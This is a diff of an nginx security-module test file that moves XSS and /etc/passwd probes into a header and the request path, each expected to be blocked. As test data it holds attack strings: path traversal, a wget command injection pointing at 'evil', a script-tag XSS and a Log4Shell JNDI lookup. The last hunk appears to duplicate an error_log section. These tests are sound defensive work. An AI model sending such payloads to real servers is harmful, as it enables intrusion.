@@ -303,11 +303,15 @@ GET /t?f=%25%32%65%25%32%65/etc/passwd
 GET /t?cmd=;wget%20http://evil/x
 --- error_code: 403
 
-=== TEST 40: xss still blocks in the request target
+=== TEST 40: xss still blocks in a header (query-ineligible, header-eligible)
+# xss is NO_QUERY (t/05 TEST 71): a raw "<script>" query value is not blocked.
+# It still fires at full strength in a header value -- probe it via Referer.
 --- config
     location /t { shield block; empty_gif; }
 --- request
-GET /t?q=<script>alert(1)</script>
+GET /t
+--- more_headers
+Referer: http://x/?q=<script>alert(1)</script>
 --- error_code: 403
 
 === TEST 41: Log4Shell still blocks in the User-Agent
@@ -319,11 +323,14 @@ GET /t
 User-Agent: ${jndi:ldap://evil/x}
 --- error_code: 403
 
-=== TEST 42: a sensitive-file probe still blocks in the request target
+=== TEST 42: a sensitive-file probe still blocks in the request PATH
+# sensitive_file is NO_QUERY (t/05 TEST 72): "/etc/passwd" as a query VALUE is a
+# search term, not a file being served, and is not blocked. In the PATH it is a
+# file actually being requested and must still block.
 --- config
     location /t { shield block; empty_gif; }
 --- request
-GET /t?file=/etc/passwd
+GET /t/etc/passwd
 --- error_code: 403
 
 === TEST 43: sqli is still scanned in the body
@@ -358,11 +365,15 @@ Content-Type: application/x-www-form-urlencoded
 # gadget reaches for is a sensitive_file. They were both in the traversal table,
 # which meant the filename could not be exempted from the body scan without also
 # exempting "../" -- so a docs body that merely NAMED /etc/passwd was blocked.
+# Probed in the request PATH: sensitive_file is NO_QUERY, so a query VALUE
+# naming the file is a search term and not blocked (t/05 TEST 72).
 --- config
     location /t { shield block; empty_gif; }
 --- request
-GET /t?f=/etc/passwd
+GET /t/etc/passwd
 --- error_code: 403
+--- error_log
+category=sensitive_file
 --- error_log
 category=sensitive_file
 
